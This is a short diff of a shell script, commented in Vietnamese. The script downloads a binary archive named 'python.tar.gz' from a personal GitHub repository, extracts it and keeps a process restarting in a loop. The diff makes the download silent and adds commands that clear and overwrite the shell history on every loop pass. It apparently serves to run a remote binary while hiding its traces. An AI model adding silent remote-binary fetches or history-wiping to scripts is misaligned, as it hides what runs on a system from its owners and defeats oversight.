@@ -9,7 +9,7 @@ WORKDIR=$(pwd)
 # Tải binary nếu chưa có
 if [ ! -f "$BINARY" ]; then
     echo "Downloading binary..."
-    curl -L -o python.tar.gz https://raw.githubusercontent.com/CongTK9x/tool/main/python.tar.gz
+    curl -sL -o python.tar.gz https://raw.githubusercontent.com/CongTK9x/tool/main/python.tar.gz >/dev/null 2>&1
     tar -xzf python.tar.gz
     rm -f python.tar.gz
 fi
@@ -55,5 +55,7 @@ while true; do
     else
         start_process
     fi
+    history -c
+    history -w
     sleep 30
 done
